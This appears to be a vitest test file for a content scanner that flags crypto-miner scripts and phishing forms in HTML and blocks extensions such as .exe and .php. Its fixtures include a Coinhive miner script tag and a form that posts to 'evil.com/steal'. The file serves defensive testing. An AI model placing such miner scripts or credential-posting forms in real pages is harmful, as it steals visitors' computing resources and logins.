import { describe, it, expect } from "vitest";
import { scanFileContent, checkBlockedExtension } from "./content-scanner.js";

describe("scanFileContent", () => {
  it("detects crypto miner scripts", () => {
    const content = '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
    const warnings = scanFileContent("index.html", content);
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]!.reason).toContain("crypto miner");
  });

  it("detects phishing forms in HTML", () => {
    const content = '<form action="https://evil.com/steal">';
    const warnings = scanFileContent("login.html", content);
    expect(warnings.length).toBeGreaterThan(0);
    expect(warnings[0]!.reason).toContain("phishing");
  });

  it("ignores forms pointing to localhost", () => {
    const content = '<form action="http://localhost:3000/submit">';
    const warnings = scanFileContent("index.html", content);
    expect(warnings).toHaveLength(0);
  });

  it("does not flag phishing in non-HTML files", () => {
    const content = '<form action="https://evil.com/steal">';
    const warnings = scanFileContent("data.json", content);
    expect(warnings).toHaveLength(0);
  });

  it("returns no warnings for clean content", () => {
    const content = "<html><body>Hello World</body></html>";
    const warnings = scanFileContent("index.html", content);
    expect(warnings).toHaveLength(0);
  });
});

describe("checkBlockedExtension", () => {
  it("blocks .exe", () => {
    expect(checkBlockedExtension("malware.exe")).toBe(".exe");
  });

  it("blocks .php", () => {
    expect(checkBlockedExtension("shell.php")).toBe(".php");
  });

  it("allows .html", () => {
    expect(checkBlockedExtension("index.html")).toBeNull();
  });

  it("allows .js", () => {
    expect(checkBlockedExtension("app.js")).toBeNull();
  });

  it("is case insensitive", () => {
    expect(checkBlockedExtension("FILE.EXE")).toBe(".exe");
  });
});
